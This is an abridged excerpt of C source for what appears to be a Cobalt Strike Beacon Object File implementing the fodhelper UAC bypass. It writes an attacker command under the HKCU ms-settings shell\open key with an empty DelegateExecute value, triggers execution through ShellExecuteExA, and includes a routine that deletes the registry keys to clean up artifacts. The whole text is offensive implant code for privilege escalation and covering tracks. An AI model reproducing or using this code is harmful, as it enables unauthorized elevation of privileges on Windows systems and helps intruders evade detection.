...
BOOL UnusedSubroutineCleanupFodHelperArtifacts(HKEY hKey) {
	...
	if (!ADVAPI32$RegDeleteKeyExA(hKey, "SOFTWARE\\Classes\\ms-settings\\shell\\open\\", KEY_WOW64_64KEY, 0))
		return FALSE;

	if (!ADVAPI32$RegDeleteKeyExA(hKey, "SOFTWARE\\Classes\\ms-settings\\shell\\", KEY_WOW64_64KEY, 0))
		return FALSE;

	if (!ADVAPI32$RegDeleteKeyExA(hKey, "SOFTWARE\\Classes\\ms-settings\\", KEY_WOW64_64KEY, 0))
		return FALSE;
...
void go(char *args, int alen) {
	...
	LSTATUS status = ADVAPI32$RegCreateKeyExA(HKEY_CURRENT_USER, (LPCSTR)registryPath, 0, NULL, 
	...
	status = ADVAPI32$RegSetValueExA(registryKey, "", 0, REG_SZ, (unsigned char*)command, MSVCRT$strlen(command));
	BeaconPrintf(CALLBACK_OUTPUT, "%s" ,status != ERROR_SUCCESS ? "[-] Failed to set the registry value.\n" 
	: "[+] Successfully set the registry value.\n");

	status = ADVAPI32$RegSetValueExA(registryKey, "DelegateExecute", 0, REG_SZ, 
	(unsigned char*)delegateExecute, MSVCRT$strlen(delegateExecute));
	...
	if (!SHELL32$ShellExecuteExA(&shellExecuteInfo)) {
